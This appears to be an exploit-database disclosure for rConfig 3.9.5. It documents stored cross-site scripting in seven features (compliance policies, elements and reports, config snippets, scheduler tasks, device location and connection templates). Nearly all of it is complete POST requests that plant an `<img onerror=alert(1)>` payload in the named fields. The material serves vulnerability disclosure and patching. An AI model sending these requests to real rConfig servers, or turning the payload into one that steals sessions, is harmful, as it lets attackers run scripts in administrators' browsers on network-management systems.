# Exploit Title: rConfig 3.9.5 - Multiple Persistent Cross Site Scripting Vulnerabilities
# Date: 06/01/2020
# Exploit Author: Matthew Aberegg, Michael Burkey
# Vendor Homepage: https://www.rconfig.com
# Software Link: https://www.rconfig.com/downloads/rconfig-3.9.5.zip
# Version: rConfig 3.9.5
# Tested on: CentOS 7 (1908)


############################################################################################################
# Vulnerable Page: https://TARGET/compliancepolicyelements.php
# Vulnerable Parameters: elementName, elementDesc, singleLine1
# Exploit: The following request will create a Policy Element that exploits the three above vulnerable parameters


POST /lib/crud/compliancepolicyelements.crud.php HTTP/1.1

------WebKitFormBoundaryAl1PAzQDNPv9L4Eu
Content-Disposition: form-data; name="elementName"

<img src=/ onerror=alert(1)>
------WebKitFormBoundaryAl1PAzQDNPv9L4Eu
Content-Disposition: form-data; name="elementDesc"

<img src=/ onerror=alert(1)>
------WebKitFormBoundaryAl1PAzQDNPv9L4Eu
Content-Disposition: form-data; name="singleParam1"

1
------WebKitFormBoundaryAl1PAzQDNPv9L4Eu
Content-Disposition: form-data; name="singleLine1"

<img src=/ onerror=alert(1)>
------WebKitFormBoundaryAl1PAzQDNPv9L4Eu
Content-Disposition: form-data; name="add"

add
------WebKitFormBoundaryAl1PAzQDNPv9L4Eu
Content-Disposition: form-data; name="editid"


------WebKitFormBoundaryAl1PAzQDNPv9L4Eu--
############################################################################################################


############################################################################################################
# Vulnerable Page: https://TARGET/compliancepolicies.php
# Vulnerable Parameters: policyName, policyDesc
# Exploit: The following request will create a Compliance Policy that exploits the two above vulnerable parameters


POST /lib/crud/compliancepolicies.crud.php HTTP/1.1

------WebKitFormBoundarymB7i5shkubG2Z4PY
Content-Disposition: form-data; name="policyName"

<img src=/ onerror=alert(1)>
------WebKitFormBoundarymB7i5shkubG2Z4PY
Content-Disposition: form-data; name="policyDesc"

<img src=/ onerror=alert(1)>
------WebKitFormBoundarymB7i5shkubG2Z4PY
Content-Disposition: form-data; name="selectedElems[]"

3
------WebKitFormBoundarymB7i5shkubG2Z4PY
Content-Disposition: form-data; name="add"

add
------WebKitFormBoundarymB7i5shkubG2Z4PY
Content-Disposition: form-data; name="editid"


------WebKitFormBoundarymB7i5shkubG2Z4PY--
############################################################################################################


############################################################################################################
# Vulnerable Page: https://TARGET/compliancereports.php
# Vulnerable Parameters: reportsName, reportsDesc
# Exploit: The following request will create a Compliance Report that exploits the two above vulnerable parameters


POST /lib/crud/compliancereports.crud.php HTTP/1.1

------WebKitFormBoundarymdyzrt2PXxVmRqH9
Content-Disposition: form-data; name="reportsName"

<img src=/ onerror=alert(1)>
------WebKitFormBoundarymdyzrt2PXxVmRqH9
Content-Disposition: form-data; name="reportsDesc"

<img src=/ onerror=alert(1)>
------WebKitFormBoundarymdyzrt2PXxVmRqH9
Content-Disposition: form-data; name="selectedPolicies[]"

2
------WebKitFormBoundarymdyzrt2PXxVmRqH9
Content-Disposition: form-data; name="add"

add
------WebKitFormBoundarymdyzrt2PXxVmRqH9
Content-Disposition: form-data; name="editid"


------WebKitFormBoundarymdyzrt2PXxVmRqH9--
############################################################################################################


############################################################################################################
# Vulnerable Page: https://TARGET/snippets.php
# Vulnerable Parameters: snippetName, snippetDesc, snippet
# Exploit: The following request will create a Config Snippet that exploits the three above vulnerable parameters


POST /lib/crud/snippets.crud.php HTTP/1.1

------WebKitFormBoundaryBe0BvSa9BSRW6XfT
Content-Disposition: form-data; name="snippetName"

<img src=/ onerror=alert(1)>
------WebKitFormBoundaryBe0BvSa9BSRW6XfT
Content-Disposition: form-data; name="snippetDesc"

<img src=/ onerror=alert(1)>
------WebKitFormBoundaryBe0BvSa9BSRW6XfT
Content-Disposition: form-data; name="snippet"

<img src=/ onerror=alert(1)>
------WebKitFormBoundaryBe0BvSa9BSRW6XfT
Content-Disposition: form-data; name="add"

add
------WebKitFormBoundaryBe0BvSa9BSRW6XfT
Content-Disposition: form-data; name="editid"


------WebKitFormBoundaryBe0BvSa9BSRW6XfT--
############################################################################################################


############################################################################################################
# Vulnerable Page: https://TARGET/scheduler.php
# Vulnerable Parameters: taskName, taskDesc
# Exploit: The following request will create a Schedule Task that exploits the two above vulnerable parameters


POST /lib/crud/scheduler.crud.php HTTP/1.1

taskType=2&reportTypeSlct%5B%5D=compare&snippetSlct=select&taskName=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&taskDesc=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&catId=1&catCommand=show+cdp+neigh&minute=0&hour=0&day=1&month=1&weekday=*&add=add&editid=
############################################################################################################


############################################################################################################
# Vulnerable Page: https://TARGET/devices.php
# Vulnerable Parameter: custom_Location
# Exploit: The following request will create a Device Object that exploits the above vulnerable parameter


POST /lib/crud/devices.crud.php HTTP/1.1

deviceName=TEST&deviceIpAddr=0.0.0.0&deviceEnablePrompt=&devicePrompt=1234&vendorId=1&deviceModel=1234&catId=1&custom_Location=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&deviceUsername=admin&devicePassword=pass&deviceEnablePassword=&templateId=1&add=add&username=admin&editid=
############################################################################################################


############################################################################################################
# Vulnerable Page: https://TARGET/deviceConnTemplates.php
# Vulnerable Parameter: name, description
# Exploit: The following request will create a Device Connection Template that exploits the above two vulnerable parameters


POST /lib/ajaxHandlers/ajaxAddTemplate.php HTTP/1.1

fileName=testfile&code=main%3A%0A++name%3A+%22%3Cimg+src%3D%2F+onerror%3Dalert(1)%3E%22%0A++desc%3A+%22%3Cimg+src%3D%2F+onerror%3Dalert(1)%3E%22%0Aconnect%3A%0A+%0A
############################################################################################################